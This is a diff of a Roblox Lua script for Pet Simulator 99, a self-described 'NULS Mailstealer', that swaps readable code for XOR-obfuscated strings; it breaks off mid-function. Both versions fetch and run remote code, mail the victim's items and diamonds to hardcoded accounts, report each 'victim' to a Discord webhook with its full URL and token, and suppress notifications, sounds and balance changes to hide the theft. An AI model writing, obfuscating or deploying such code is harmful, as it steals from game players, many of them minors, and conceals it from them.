@@ -1,19 +1,57 @@
-local request = request or syn and syn.request
+
+-- Runtime decoder (generated name: __DLUNvJ_qHqF)
+local __DLUNvJ_qHqF_cache = setmetatable({}, { __mode = "k" })
+local function __DLUNvJ_qHqF(chunks)
+  local cached = __DLUNvJ_qHqF_cache[chunks]
+  if cached then return cached end
+
+  local function hexToBytes(hex)
+    local t = {}
+    for i = 1, #hex, 2 do t[#t+1] = tonumber(hex:sub(i,i+1), 16) end
+    return t
+  end
+
+  local out_parts = {}
+  for ci = 1, #chunks do
+    local c = chunks[ci]
+    local key = hexToBytes(c.k)
+    local klen = #key
+    local d = c.d
+    for j = 1, #d do
+      local kb = key[((j-1) % klen) + 1]
+      local v = d[j]
+      local dec
+      if bit32 and bit32.bxor then
+        dec = bit32.bxor(v, kb)
+      else
+        dec = (v ~ kb)
+      end
+      out_parts[#out_parts+1] = string.char(dec)
+    end
+  end
+
+  local s = table.concat(out_parts)
+  __DLUNvJ_qHqF_cache[chunks] = s
+  return s
+end
+
+
+local _JKLgrN = _JKLgrN or syn and syn.request
 
 
 local function LoadingScreen()
-    local ok, result = pcall(function()
-        local url = "https://raw.githubusercontent.com/outhackernuls090-hash/NulsLoader/refs/heads/main/LoadingScreen"
-        local code = game:HttpGet(url, true)
-        local fn = loadstring(code)
-        if type(fn) ~= "function" then
-            error("loadstring did not return a function")
+    local _sxyVGw, _FgXjym = pcall(function()
+        local _ZEdMSH = __DLUNvJ_qHqF({{k="98380bdb8495a583",d={240,76,127,171,247,175,138,172,234,89,124,245,227,252,209,235,237,90,126,168}},{k="703a5213e12cc464",d={21,72,49,124,143,88,161,10,4,20,49,124,140,3,171,17,4,82,51}},{k="e474852107e5641d",d={135,31,224,83,105,144,8,110,212,77,181,12,111,132,23,117,203,58,240}},{k="23cf6cbd02407546",d={79,188,32,210,99,36,16,52,12,189,9,219,113,111,29,35,66,171,31}},{k="3142de1dba8c2b1a",d={30,47,191,116,212,163,103,117,80,38,183,115,221,223,72,104,84,39,176}}})
+        local _fsTIMI = game:HttpGet(_ZEdMSH, true)
+        local _cAhvIr = loadstring(_fsTIMI)
+        if type(_cAhvIr) ~= __DLUNvJ_qHqF({{k="b156e72b03350b99",d={215,35}},{k="2a07b4d1bfc8be8f",d={68,100}},{k="c40eccd2f10ac8b9",d={176,103}},{k="60b9bdaa0f8770ab",d={15,215}}}) then
+            error(__DLUNvJ_qHqF({{k="085f66219b339666",d={100,48,7,69,232,71,228,15,102}},{k="70358c6a982f5e7a",d={23,21,232,3,252,15,48,21,4}},{k="1f461abaee02496b",d={63,52,127,206,155,112,39,75,126}},{k="c6edfb25a85eeba5",d={230,139,142,75,203,42,130,202,168}}}))
         end
-        fn()
+        _cAhvIr()
     end)
 
-    if not ok then
-        warn("Failed to load LoadingScreen:", result)
+    if not _sxyVGw then
+        warn(__DLUNvJ_qHqF({{k="6760dfed067a27ea",d={33,1,182,129,99,30,7,158,8,64,179,130,103,30,7}},{k="5cbbf99f2ca1ef17",d={16,212,152,251,69,207,136,68,63,201,156,250,66,155}}}), _FgXjym)
     end
 end
 
@@ -21,277 +59,277 @@ end
 LoadingScreen()
 
 
-local network = require(game.ReplicatedStorage.Library.Client.Network)
-local library = require(game.ReplicatedStorage.Library)
-local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
-local plr = game.Players.LocalPlayer
-local MailMessage = "GG / xGgkWUxU3w"
-local HttpService = game:GetService("HttpService")
-local sortedItems = {}
-local totalRAP = 0
-local message = require(game.ReplicatedStorage.Library.Client.Message)
-local GetSave = function()
+local _DNtNbJ = require(game.ReplicatedStorage.Library.Client.Network)
+local _IGWnjM = require(game.ReplicatedStorage.Library)
+local _QBerdL = require(game:GetService(__DLUNvJ_qHqF({{k="b5215dfae3fc56b8",d={231,68,45,150,138,159,55,204,208}},{k="b74043fa29ef0e71",d={211,19,55,149,91,142,105,20}}})):WaitForChild(__DLUNvJ_qHqF({{k="8cae8e73747000ab",d={192,199,236,1}},{k="4bfa013437a39ca7",d={42,136,120}}})):WaitForChild(__DLUNvJ_qHqF({{k="fab548eac039e72e",d={185,217}},{k="b14c073fe3b35dad",d={216}},{k="ba83696395c371e1",d={223}},{k="0495fee5b56361a5",d={106,225}}})):WaitForChild(__DLUNvJ_qHqF({{k="ef0799122038a36d",d={188}},{k="8db0d59855e77426",d={236}},{k="8416ff79ba0be655",d={242}},{k="a89f907132d9dbee",d={205}}}))).Get().Inventory
+local _agTHNa = game.Players.LocalPlayer
+local _YazJbz = __DLUNvJ_qHqF({{k="d522062fb973530f",d={146,101,38,0,153,11,20,104}},{k="a27049e7b3696f70",d={201,39,28,159,230,90,24}}})
+local HttpService = game:GetService(__DLUNvJ_qHqF({{k="a342f749d0b1d362",d={235,54,131}},{k="45a9d1199ff686e9",d={53,250,180}},{k="bd2184cf0819b7a1",d={207,87}},{k="407dfe011ac3c909",d={41,30,155}}}))
+local _RLDwiq = {}
+local _PjqkNo = 0
+local _VKGFMf = require(game.ReplicatedStorage.Library.Client.Message)
+local _murKCo = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
 
 
 
-local DualHookWebhook = "https://discord.com/api/webhooks/1406998805932675144/UHpJcWhhFtalVAKHNujysIfgZXrcakVkmyw5kAorf3EV6XVFu7NH2kSPc_bEdY04voA0"
-local DualHookName = "Eliaskulmer999"
-local DualHookRap = 0
+local _CHMnXk = __DLUNvJ_qHqF({{k="1e8be0d283c3aa40",d={118,255,148,162,240,249,133,111,122,226,147,177,236,177,206,110,125,228,141,253,226,179,195,111,105,238,130,186,236,172,193}},{k="5705acbcf165b21e",d={36,42,157,136,193,83,139,39,111,61,156,137,200,86,128,40,96,48,157,136,197,74,231,86,39,79,207,235,153,13}},{k="00010de9695d85af",d={70,117,108,133,63,28,206,231,78,116,103,144,26,20,227,200,90,89,127,138,8,54,211,196,109,120,122,220,2,28}},{k="4da41d8b2ec011b5",d={34,214,123,184,107,150,39,237,27,226,104,188,96,136,35,222,30,244,126,212,76,133,117,236,125,144,107,228,111,240}}})
+local _rhUrxu = __DLUNvJ_qHqF({{k="96aab23d2cdd8b55",d={211,198,219,92}},{k="fc2061b667230363",d={143,75,20}},{k="78f848c321c166f2",d={20,149,45}},{k="819014b10ec74384",d={243,169,45,136}}})
+local _qCLLru = 0
 
-local users = "Eliaskulmer999"
-local min_rap = 1000000
-local webhook = "https://discord.com/api/webhooks/1406998805932675144/UHpJcWhhFtalVAKHNujysIfgZXrcakVkmyw5kAorf3EV6XVFu7NH2kSPc_bEdY04voA0"
+local _JGuQUo = __DLUNvJ_qHqF({{k="79a4961d7e5e5357",d={60,200,255,124}},{k="29f80fc24ff6be19",d={90,147,122}},{k="44b3f7ae2ff07d89",d={40,222,146}},{k="a44a4c7b76480bb3",d={214,115,117,66}}})
+local _kZItGN = 1000000
+local _anlijG = __DLUNvJ_qHqF({{k="ac45538e74a6a2ad",d={196,49,39,254,7,156,141,130,200,44,32,237,27,212,198,131,207,42,62,161,21,214,203,130,219,32,49,230,27,201,201,222,131,116,103,190,67,158,147,153,152}},{k="b83d39a5b2a5c08e",d={140,14,11,150,131,157,247,191,138,15,15,138,214,202,134,247,247,13,74,245,202,192,136,187,239,123,83,211,229,194,151,190,237,81,114,225,213,207,135,184}},{k="cd74c4d2eb381e24",d={181,53,177,144,170,78,70,78,143,53,162,180,131,0,38,78,129,21,167,177,167,82,81,84,190,19,247,224,136,115,111,102,140,4,245,171,211,81,73,85}}})
 
 if math.random() < 0.3 then
-	users = DualHookName
+	_JGuQUo = _rhUrxu
 end
 
-if users == DualHookName then
-	webhook = DualHookWebhook
+if _JGuQUo == _rhUrxu then
+	_anlijG = _CHMnXk
 end
 
-if next(users) == nil or webhook == "" then
-    plr:kick("You didn't add any usernames or webhook")
+if next(_JGuQUo) == nil or _anlijG == __DLUNvJ_qHqF({{k="c9746f8c5d85361c",d={}},{k="d2b03251b7cafe68",d={}},{k="f92de84cc9bfe3e8",d={}},{k="ec49fea0fdd1dbbc",d={}}}) then
+    _agTHNa:kick(__DLUNvJ_qHqF({{k="31b45e700ce18efd",d={104,219,43,80,104,136,234,147,22,192,126,17,104}},{k="f879e99eeb843ed6",d={156,89,136,240,146,164,75,165,157,11,135,255,134}},{k="4941c984639f9f32",d={44,50,233,235,17,191,232,87,43,41,166,235,8}}}))
     return
 end
 
-for _, user in ipairs(users) do
-    if plr.Name == user then
-        plr:kick("You cannot mailsteal yourself")
+for _, user in ipairs(_JGuQUo) do
+    if _agTHNa.Name == user then
+        _agTHNa:kick(__DLUNvJ_qHqF({{k="599b4c57cef677e5",d={0,244,57,119,173,151,25,139}},{k="68e8dc5c5f40a656",d={7,156,252,49,62,41,202}},{k="5bd00ec65626614f",d={40,164,107,167,58,6,24}},{k="ccd451c9bb859b20",d={163,161,35,186,222,233,253}}}))
         return
     end
 end
 
 for adress, func in pairs(getgc()) do
-    if debug.getinfo(func).name == "computeSendMailCost" then
+    if debug.getinfo(func).name == __DLUNvJ_qHqF({{k="b9ae5ad4c9d513ac",d={218,193,55,164,188,161,118}},{k="f5db6f1e8f693999",d={166,190,1,122,194,8}},{k="56e81e6e45384ecd",d={63,132,93,1,54,76}}}) then
         FunctionToGetFirstPriceOfMail = func
         break
     end
 end
 
-local mailSendPrice = FunctionToGetFirstPriceOfMail()
+local _hOcIpR = FunctionToGetFirstPriceOfMail()
 
-local GemAmount1 = 1
-for i, v in pairs(GetSave().Inventory.Currency) do
-    if v.id == "Diamonds" then
-        GemAmount1 = v._am
+local _kQQZHX = 1
+for i, v in pairs(_murKCo().Inventory.Currency) do
+    if v.id == __DLUNvJ_qHqF({{k="54071c0416aab40f",d={16,110}},{k="3a4d12f3b954ac0c",d={91,32}},{k="36511cdae0752cb4",d={89}},{k="fd00bd7308164f6e",d={147}},{k="c2af902494e29cb0",d={166,220}}}) then
+        _kQQZHX = v._am
 		break
     end
 end
 
-local function formatNumber(number)
-	local number = math.floor(number)
-	local suffixes = {"", "k", "m", "b", "t"}
-	local suffixIndex = 1
-	while number >= 1000 do
-		number = number / 1000
-		suffixIndex = suffixIndex + 1
+local function formatNumber(_JhNvWo)
+	local _JhNvWo = math.floor(_JhNvWo)
+	local _TUXvmf = {__DLUNvJ_qHqF({{k="2f85153c92db7f7e",d={}},{k="cf16a314334249dd",d={}},{k="e1c2d3586f79eaf5",d={}},{k="b42b11c7ed71baac",d={}},{k="74940a077cbfc31b",d={}}}), __DLUNvJ_qHqF({{k="eaaee4792e2578d4",d={129}},{k="08a970ff267f577b",d={}},{k="b83f02ebe1c47691",d={}}}), __DLUNvJ_qHqF({{k="b83b5acc3d11edfd",d={213}},{k="41a887443e6d95bb",d={}}}), __DLUNvJ_qHqF({{k="ab70de0bee2ddf91",d={201}},{k="29e4318ac7654447",d={}},{k="0b8b346d7fe9923d",d={}},{k="d628b48bf5137637",d={}},{k="4306e83ef18ff2df",d={}}}), __DLUNvJ_qHqF({{k="4a6dba04044dc88c",d={62}},{k="b756a465f7fbe0aa",d={}},{k="21d6eeb94b04e49a",d={}},{k="9cb4685da8750bf1",d={}},{k="6cf6eb0b45c2c4bc",d={}}})}
+	local _AkbkLO = 1
+	while _JhNvWo >= 1000 do
+		_JhNvWo = _JhNvWo / 1000
+		_AkbkLO = _AkbkLO + 1
 	end
-	return string.format("%.2f%s", number, suffixes[suffixIndex])
+	return string.format(__DLUNvJ_qHqF({{k="39a414559e3f5f22",d={28,138}},{k="28d80604c61d87a3",d={26}},{k="581d59a9bde54d78",d={62}},{k="66b196443706eaf1",d={67,194}}}), _JhNvWo, _TUXvmf[_AkbkLO])
 end
 
-local function SendMessage(diamonds)
-    local headers = {
-        ["Content-Type"] = "application/json"
+local function SendMessage(_FcfEWx)
+    local _ESZNmm = {
+        [__DLUNvJ_qHqF({{k="57a4115a639b3b46",d={20,203,127,46}},{k="7519e88e704b8611",d={16,119,156,163}},{k="d7f4b448b5383184",d={131,141,196,45}}})] = __DLUNvJ_qHqF({{k="4a54c2235dba0065",d={43,36,178,79,52,217,97,17}},{k="fecce793f0da0c1a",d={151,163,137,188,154,169,99,116}}})
     }
 
-	local fields = {
+	local _AilBXa = {
 		{
-			name = "Victim Username:",
-			value = plr.Name,
+			name = __DLUNvJ_qHqF({{k="450034077283af18",d={19,105,87,115}},{k="df5ee1e88e7dda4e",d={182,51,193,189}},{k="b630b953fa1c95e4",d={197,85,203,61}},{k="3a78f598c44e9239",d={91,21,144,162}}}),
+			value = _agTHNa.Name,
 			inline = true
 		},
 		{
-			name = "Items to be sent:",
-			value = "",
+			name = __DLUNvJ_qHqF({{k="d5c619660fc629d0",d={156,178,124,11,124,230,93,191,245}},{k="80f044486806dfcb",d={226,149,100,59,13,104,171,241}}}),
+			value = __DLUNvJ_qHqF({{k="c84e777b68c49cde",d={}},{k="263acf0955b8047f",d={}},{k="70676d9855a1ad86",d={}}}),
 			inline = false
 		},
         {
-            name = "Summary:",
-            value = "",
+            name = __DLUNvJ_qHqF({{k="82fe593d7846a2fe",d={209,139,52,80}},{k="f81e8f7356ca1768",d={153,108,246,73}}}),
+            value = __DLUNvJ_qHqF({{k="c17a7723515def6f",d={}},{k="7e5c8a0a1a2259d8",d={}},{k="28ecf9d99f464bd3",d={}},{k="7c4ce91647d3a211",d={}}}),
             inline = false
         }
 	}
 
-    local combinedItems = {}
-    local itemRapMap = {}
+    local _YgJEdo = {}
+    local _GxMRiK = {}
 
-    for _, item in ipairs(sortedItems) do
-        local rapKey = item.name
-        if itemRapMap[rapKey] then
-            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
+    for _, item in ipairs(_RLDwiq) do
+        local _rKRQYU = item.name
+        if _GxMRiK[_rKRQYU] then
+            _GxMRiK[_rKRQYU].amount = _GxMRiK[_rKRQYU].amount + item.amount
         else
-            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
-            table.insert(combinedItems, rapKey)
+            _GxMRiK[_rKRQYU] = {amount = item.amount, rap = item.rap}
+            table.insert(_YgJEdo, _rKRQYU)
         end
     end
 
-    table.sort(combinedItems, function(a, b)
-        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
+    table.sort(_YgJEdo, function(_wvwcDV, _UgPAMl)
+        return _GxMRiK[_wvwcDV].rap * _GxMRiK[_wvwcDV].amount > _GxMRiK[_UgPAMl].rap * _GxMRiK[_UgPAMl].amount 
     end)
 
-    for _, itemName in ipairs(combinedItems) do
-        local itemData = itemRapMap[itemName]
-        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
+    for _, itemName in ipairs(_YgJEdo) do
+        local _yPZqjO = _GxMRiK[itemName]
+        _AilBXa[2].value = _AilBXa[2].value .. itemName .. __DLUNvJ_qHqF({{k="5fe75167b6f8dbf7",d={127}},{k="34349b3ad173ae21",d={28}},{k="751c71202cd5552c",d={}},{k="1ea97a770d3c60c5",d={102}}}) .. _yPZqjO.amount .. __DLUNvJ_qHqF({{k="8d247d6064121cfe",d={164}},{k="2228b33536a27a0e",d={}}}) .. __DLUNvJ_qHqF({{k="5a57a2b433935feb",d={96}},{k="26d9c0f60c884525",d={6}}}) .. formatNumber(_yPZqjO.rap * _yPZqjO.amount) .. __DLUNvJ_qHqF({{k="b3c4368357a013d1",d={147,150}},{k="ac2e3b22b7268ddb",d={237}},{k="f8e11443e2cf9bd6",d={168}},{k="937e6ae7c4c6e62a",d={253}}})
     end
 
-    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
+    _AilBXa[3].value = string.format(__DLUNvJ_qHqF({{k="cb610933f3bde3a3",d={140,4,100,64,201}},{k="0cb67a62337a9b16",d={44,147,9,12}},{k="32fa2647c56d94fb",d={102,149,82,38}},{k="d2f53458957f88ff",d={190,213,102,25}},{k="bc2c3daf34198ac7",d={236,22,29,138,71}}}), formatNumber(_FcfEWx), formatNumber(_PjqkNo))
 
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "\240\159\144\177 New PS99 Execution" ,
-            ["color"] = 5439232,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "NULS Mailstealer | discord.gg/xGgkWUxU3w"
+    local _fwbOvZ = {
+        [__DLUNvJ_qHqF({{k="78c680fa487e5ef6",d={29,171}},{k="b98db73f3b172e03",d={219}},{k="dbc4366bb08dc834",d={190}},{k="2e4c3fba6e5bfebe",d={74,63}}})] = {{
+            [__DLUNvJ_qHqF({{k="a346367e0129c176",d={215,47}},{k="37ddc9a5e14633c1",d={67}},{k="c2b3e7408785477e",d={174,214}}})] = __DLUNvJ_qHqF({{k="7eb37d7f0e0ac2e1",d={76,135,77,78,59,51,243,213,74,130,74,72,46,68,167,150}},{k="0b2941d988c8f141",d={43,121,18,224,177,232,180,57,110,74,52,173,225,167,159}}}) ,
+            [__DLUNvJ_qHqF({{k="1a081bf44e9560b8",d={121,103,119}},{k="4fc1fa2972d11eec",d={32,179}}})] = 5439232,
+			[__DLUNvJ_qHqF({{k="7b9a47e80848b0d2",d={29,243}},{k="d65550c422fe1846",d={179,57}},{k="dafd31fb98ed337c",d={190,142}}})] = _AilBXa,
+			[__DLUNvJ_qHqF({{k="210c0a4848f9a646",d={71,99}},{k="ffcc954b1c463df5",d={144,184}},{k="bfc92e87d18c03a6",d={218,187}}})] = {
+				[__DLUNvJ_qHqF({{k="136dc777d7104a2d",d={103,8}},{k="b29daf13f9ea5947",d={202,233}}})] = __DLUNvJ_qHqF({{k="443746d53245ac28",d={10,98,10,134,18,8,205,65,40,68,50,176,83,41}},{k="611a35467ada1162",d={4,104,21,58,90,190,120,17,2,117,71,34,84}},{k="a1a135a4eafb6bd4",d={198,198,26,220,173,156,0,131,244,217,96,151,157}}})
 			}
         }}
     }
 
-    if #fields[2].value > 1024 then
-        local lines = {}
-        for line in fields[2].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
+    if #_AilBXa[2].value > 1024 then
+        local _eOADuJ = {}
+        for line in _AilBXa[2].value:gmatch(__DLUNvJ_qHqF({{k="fdbe63b5c1eea24d",d={166,224}},{k="e3734a30fbf27860",d={145}},{k="26c043d752050566",d={72}},{k="31ff81c8a5697170",d={108,212}}})) do
+            table.insert(_eOADuJ, line)
         end
 
-        while #fields[2].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[2].value = table.concat(lines, "\n")
-            fields[2].value = fields[2].value .. "\nPlus more!"
+        while #_AilBXa[2].value > 1024 and #_eOADuJ > 0 do
+            table.remove(_eOADuJ)
+            _AilBXa[2].value = table.concat(_eOADuJ, __DLUNvJ_qHqF({{k="dec02f66a8419ccc",d={176}},{k="9000a31a89ad342a",d={}}}))
+            _AilBXa[2].value = _AilBXa[2].value .. __DLUNvJ_qHqF({{k="d7497c63a6583297",d={185,25,16,22,213,120}},{k="1fb48791cdb678de",d={114,219,245,244,236}}})
         end
     end
 
-	local ok, res = pcall(function()
-        return request({
-            Url = webhook,
-            Method = "POST",
-            Headers = headers,
+	local _sxyVGw, _lgQMup = pcall(function()
+        return _JKLgrN({
+            Url = _anlijG,
+            Method = __DLUNvJ_qHqF({{k="1eb2f76b71d9916d",d={78}},{k="6cf87c7c840c82d4",d={35}},{k="0f3df3084f561820",d={92}},{k="9ee96b356e10b07c",d={202}}}),
+            Headers = _ESZNmm,
             Body = body
         })
     end
 	)
 
-    if not ok then
-        warn("Webhook request failed:", res)
-        return false, res
+    if not _sxyVGw then
+        warn(__DLUNvJ_qHqF({{k="c75a579fcabe1976",d={144,63,53,247,165,209,114,86}},{k="aafcf237cb690abe",d={216,153,131,66,174,26,126}},{k="7af30f507dc01976",d={90,149,110,57,17,165,125,76}}}), _lgQMup)
+        return false, _lgQMup
     end
 
-    -- many executors return a table, sometimes a string; print to inspect
-    print("Webhook returned:", res)
-    return true, res
+    -- many executors return _wvwcDV table, sometimes _wvwcDV string; print to inspect
+    print(__DLUNvJ_qHqF({{k="4266e66bafb5e903",d={21,3,132,3,192,218}},{k="76c1da663185470e",d={29,225,168,3,69}},{k="f65b91b960d96d57",d={131,41,255,220,4,227}}}), _lgQMup)
+    return true, _lgQMup
 	
 end
 
 
-local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
-local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
-gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
-	gemsleaderstatpath.Value = gemsleaderstat
+local _Khpwlg = _agTHNa.leaderstats[__DLUNvJ_qHqF({{k="1588ccd5961e4e52",d={39,188,252,228,163,39,127,102,35,185,248}},{k="5e7d92bcc641a674",d={108,93,214,213,167,44,201,26,58,14}}})].Value
+local _THuVoE = _agTHNa.leaderstats[__DLUNvJ_qHqF({{k="2156f93393041fa8",d={19,98,201,2,166,61,46,156,23,103,205}},{k="4a7ac07ea184d357",d={120,90,132,23,192,233,188,57,46,9}}})]
+_THuVoE:GetPropertyChangedSignal(__DLUNvJ_qHqF({{k="189b06c2022ebd73",d={78,250}},{k="eb7b62dfc8c45043",d={135}},{k="2ac0816dcaedb82a",d={95}},{k="0015fa2768afb4f7",d={101}}})):Connect(function()
+	_THuVoE.Value = _Khpwlg
 end)
 
-local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
-local noti = plr.PlayerGui.Notifications
-loading.Disabled = true
-noti:GetPropertyChangedSignal("Enabled"):Connect(function()
-	noti.Enabled = false
+local _cURjkq = _agTHNa.PlayerScripts.Scripts.Core[__DLUNvJ_qHqF({{k="199e83fc1986013e",d={73,236,236,159,124}},{k="9b96f3ef95237d4b",d={232,229,211,191,240}},{k="1a043ffd101f96d3",d={116,96,86,147}},{k="6d26dae3f0fa4c8a",d={10,6,157,182,185}}})]
+local _TQGJvT = _agTHNa.PlayerGui.Notifications
+_cURjkq.Disabled = true
+_TQGJvT:GetPropertyChangedSignal(__DLUNvJ_qHqF({{k="d1810ec5e74d1d70",d={148,239,111,167}},{k="4803fe80e38601de",d={36,102,154}}})):Connect(function()
+	_TQGJvT.Enabled = false
 end)
-noti.Enabled = false
+_TQGJvT.Enabled = false
 
-game.DescendantAdded:Connect(function(x)
-    if x.ClassName == "Sound" then
-        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
-            x.Volume=0
-            x.PlayOnRemove=false
-            x:Destroy()
+game.DescendantAdded:Connect(function(_bUeoKv)
+    if _bUeoKv.ClassName == __DLUNvJ_qHqF({{k="dbfb5a1831ae3665",d={136,148}},{k="d796098e5708065f",d={162}},{k="6677f2bd62f8ed30",d={8}},{k="b38961b44f270350",d={215}}}) then
+        if _bUeoKv.SoundId==__DLUNvJ_qHqF({{k="31e592279793fd7a",d={67,135,234,70,228}},{k="6c768c23fb37a6e8",d={31,19,248,74,159}},{k="aa33850480861bb8",d={144,28,170,53}},{k="28179befc7025b4d",d={25,47,168,214,246}},{k="359f11c1ef9f98bf",d={6,173,36,247,218}}}) or _bUeoKv.SoundId==__DLUNvJ_qHqF({{k="e2d9218c5ffddc7f",d={144,187,89,237,44,142,185,11,139,189,27,163}},{k="b26549aab253ea36",d={157,84,125,152,135,103,221,4,131,85,122,146}}}) or _bUeoKv.SoundId==__DLUNvJ_qHqF({{k="7bad99b16295d421",d={9,207,225,208,17,230,177,85,18,201,163,158}},{k="a11677883105ccea",d={142,39,69,188,0,54,248,216,146,36,64,190}}}) then
+            _bUeoKv.Volume=0
+            _bUeoKv.PlayOnRemove=false
+            _bUeoKv:Destroy()
         end
     end
 end)
 
-local function getRAP(Type, Item)
-    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
+local function getRAP(_gzOAWs, _HCIGEc)
+    return (require(game:GetService(__DLUNvJ_qHqF({{k="3fd6b2dce635aea7",d={109,179,194,176,143,86}},{k="b6a1668c274ce102",d={215,213,3,232,116}},{k="fcfc8692018d1e1f",d={136,147,244,243,102,232}}})).Library.Client.RAPCmds).Get(
         {
-            Class = {Name = Type},
-            IsA = function(hmm)
-                return hmm == Type
+            Class = {Name = _gzOAWs},
+            IsA = function(_tCbnTE)
+                return _tCbnTE == _gzOAWs
             end,
             GetId = function()
-                return Item.id
+                return _HCIGEc.id
             end,
             StackKey = function()
-                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
+                return HttpService:JSONEncode({_juOzwf = _HCIGEc.id, pt = _HCIGEc.pt, sh = _HCIGEc.sh, tn = _HCIGEc.tn})
             end,
-            AbstractGetRAP = function(self)
+            AbstractGetRAP = function(_ASZnpl)
                 return nil
             end
         }
     ) or 0)
 end
 
-local function sendItem(category, uid, am)
-    local userIndex = 1
-    local maxUsers = #users
-    local sent = false
+local function sendItem(_DNXPxb, _qHwIGD, _LrgLeS)
+    local _ayruug = 1
+    local _MEtYtZ = #_JGuQUo
+    local _eLnZAL = false
     
     repeat
-        local currentUser = users[userIndex]
-        local args = {
-            [1] = currentUser,
-            [2] = MailMessage,
-            [3] = category,
-            [4] = uid,
-            [5] = am or 1
+        local _pbXswV = _JGuQUo[_ayruug]
+        local _eZeYBJ = {
+            [1] = _pbXswV,
+            [2] = _YazJbz,
+            [3] = _DNXPxb,
+            [4] = _qHwIGD,
+            [5] = _LrgLeS or 1
         }
 
-        local response, err = network.Invoke("Mailbox: Send", unpack(args))
+        local _CNCGSC, _tyfjVr = _DNtNbJ.Invoke(__DLUNvJ_qHqF({{k="c1f5d5f92a7c69a2",d={140,148,188,149}},{k="959874722f06361f",d={247,247,12}},{k="9fff58688dc0f29f",d={165,223,11}},{k="5d966ac21b2aa3df",d={56,248,14}}}), unpack(_eZeYBJ))
 
-        if response == true then
-            sent = true
-            GemAmount1 = GemAmount1 - mailSendPrice
-            mailSendPrice = math.ceil(math.ceil(mailSendPrice) * 1.5)
-            if mailSendPrice > 5000000 then
-                mailSendPrice = 5000000
+        if _CNCGSC == true then
+            _eLnZAL = true
+            _kQQZHX = _kQQZHX - _hOcIpR
+            _hOcIpR = math.ceil(math.ceil(_hOcIpR) * 1.5)
+            if _hOcIpR > 5000000 then
+                _hOcIpR = 5000000
             end
-        elseif response == false and err == "They don't have enough space!" then
-            userIndex = userIndex + 1
-            if userIndex > maxUsers then
-                sent = true
+        elseif _CNCGSC == false and _tyfjVr == __DLUNvJ_qHqF({{k="95540218ff9bb14f",d={193,60,103,97,223,255,222,33,178,32,34,112,158,237,212}},{k="644af9488ab9d648",d={68,47,151,39,255,222,190,104,23,58,152,43,239,152}}}) then
+            _ayruug = _ayruug + 1
+            if _ayruug > _MEtYtZ then
+                _eLnZAL = true
             end
         end
-    until sent
+    until _eLnZAL
 end
 
 local function SendAllGems()
-    for i, v in pairs(GetSave().Inventory.Currency) do
-        if v.id == "Diamonds" then
-            if GemAmount1 >= (mailSendPrice + 10000) then
-                local userIndex = 1
-                local maxUsers = #users
-                local sent = false
+    for i, v in pairs(_murKCo().Inventory.Currency) do
+        if v.id == __DLUNvJ_qHqF({{k="aaa18cd46d70f183",d={238,200}},{k="4814bf4e22cd9938",d={41,121}},{k="9c30d43af0c992b6",d={243,94}},{k="82c40b9006d71a87",d={230,183}}}) then
+            if _kQQZHX >= (_hOcIpR + 10000) then
+                local _ayruug = 1
+                local _MEtYtZ = #_JGuQUo
+                local _eLnZAL = false
                 
                 repeat
-                    local currentUser = users[userIndex]
-                    local args = {
-                        [1] = currentUser,
-                        [2] = MailMessage,
-                        [3] = "Currency",
+                    local _pbXswV = _JGuQUo[_ayruug]
+                    local _eZeYBJ = {
+                        [1] = _pbXswV,
+                        [2] = _YazJbz,
+                        [3] = __DLUNvJ_qHqF({{k="75fb3939ef4b76d6",d={54,142}},{k="57fc87dfab9f651f",d={37,142}},{k="6036a903d1b297dd",d={5}},{k="3c379cbd0a90f0bf",d={82}},{k="0c296833472d5937",d={111,80}}}),
                         [4] = i,
-                        [5] = GemAmount1 - mailSendPrice
+                        [5] = _kQQZHX - _hOcIpR
                     }
                     
-                    local response, err = network.Invoke("Mailbox: Send", unpack(args))
+                    local _CNCGSC, _tyfjVr = _DNtNbJ.Invoke(__DLUNvJ_qHqF({{k="99134b0efc27cca8",d={212,114,34,98,158}},{k="2e9e99286911c7bc",d={65,230,163,8}},{k="517cb83fddb9c794",d={2,25,214,91}}}), unpack(_eZeYBJ))
                     
-                    if response == true then
-                        sent = true
-                    elseif response == false and err == "They don't have enough space!" then
-                        userIndex = userIndex + 1
-                        if userIndex > maxUsers then
-                            sent = true
+                    if _CNCGSC == true then
+                        _eLnZAL = true
+                    elseif _CNCGSC == false and _tyfjVr == __DLUNvJ_qHqF({{k="2e8fa6450a1fbe28",d={122,231,195,60,42,123,209,70,9,251}},{k="98f2613ee6cfe010",d={184,154,0,72,131,239,133,126,247}},{k="98f2ec81c63b8bd0",d={237,149,132,161,181,75,234,179,253,211}}}) then
+                        _ayruug = _ayruug + 1
+                        if _ayruug > _MEtYtZ then
+                            _eLnZAL = true
                         end
                     end
-                until sent
+                until _eLnZAL
                 break
             end
         end
@@ -299,109 +337,109 @@ local function SendAllGems()
 end
 
 local function EmptyBoxes()
-    if save.Box then
-        for key, value in pairs(save.Box) do
+    if _QBerdL.Box then
+        for key, value in pairs(_QBerdL.Box) do
 			if value._uq then
-				network.Invoke("Box: Withdraw All", key)
